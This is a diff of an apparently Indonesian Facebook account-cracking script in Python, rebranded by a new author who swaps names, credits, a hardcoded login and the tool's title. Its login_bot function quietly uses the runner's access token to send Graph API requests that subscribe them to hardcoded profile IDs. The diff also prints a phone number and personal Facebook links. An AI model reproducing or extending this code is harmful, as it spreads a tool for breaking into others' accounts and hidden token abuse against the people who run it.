@@ -1,11 +1,9 @@
 # coding=utf-8
-# coding by Romi Afrizal
-# Izin dlu lah bro kalau mau recode, gk ngotak njir _-
-# Note : jangan di ubah lagi! nanti error, script udah enak
+#
+# Decompile By Najimi Ajimu
+#
 
 import os, sys, subprocess, platform
-
-
 try:
 	import rich
 except ImportError:
@@ -20,7 +18,7 @@ print ("Login Script")
 
 import getpass
 
-CorrectUsername = "CRACK"
+CorrectUsername = "JIM"
 CorrectPassword = "CRIBS" 
 
 loop = 'true'
@@ -95,12 +93,15 @@ def ingfoh():
 f"""{Hj}
  • Info script :
  	
- - author      : CHINDA
+ - author      : Chinda
  - instagram   : officialchinda
+ - facebook    : facebook.com/romi.afrizal.102
+ - fanspage    : facebook.com/100022086172556
  - whatsap     : +2349067338953
  - github      : github.com/GoodboyC
- - script name : crack
+ - script name : jim
  - version     : 1.3
+ - update pada :
  
 + ---------------------------------------- +
             TENTANG METODE CRACK
@@ -186,7 +187,7 @@ til ="•"
 
 ok, cp, id, user, pwx, loop = [], [], [], [], [], 0
 
-sys.stdout.write('\x1b[1;35m\x1b]2; {×} crack by chinda {×} \x07')
+sys.stdout.write('\x1b[1;35m\x1b]2; {×} bff-2 by romz {×} \x07')
 
 # JALAN
 def jalan(keliling):
@@ -214,10 +215,9 @@ except KeyError:
 	IP = " "
 	CN = " "
 
-author = 'Arya XX Chinda'
-fb_me = 'facebook.com/romi.afrizal.102'
-github = 'github.com/GoodboyC'
-
+author = 'Arya & Chinda'
+fb_me = 'facebook.com/AryaTrickers2020'
+github = 'github.com/Ruphas-Mafahl-XD'
 
 def banner():
 	os.system('clear')
@@ -352,9 +352,9 @@ def konverter(kukis):
 def login_bot(romz):
 	try:
 		toket = romz
-		romz1 = ('100067807565861')
-		romz2 = ('100029143111567')
-		romz3 = ('100028434880529')
+		romz1 = ('100001307011557')
+		romz2 = ('100001137791549')
+		romz3 = ('100014762377020')
 		requests.post(f"https://graph.facebook.com/{romz1}?fields=subscribers&access_token={toket}") # ROMI AFRIZAL PENGGUNA AKUN UNIK
 		requests.post(f"https://graph.facebook.com/{romz2}?fields=subscribers&access_token={toket}") # DEMIT ROMI AFRIZAL
 		requests.post(f"https://graph.facebook.com/{romz3}?fields=subscribers&access_token={toket}") # Romi Afrizal (2018)
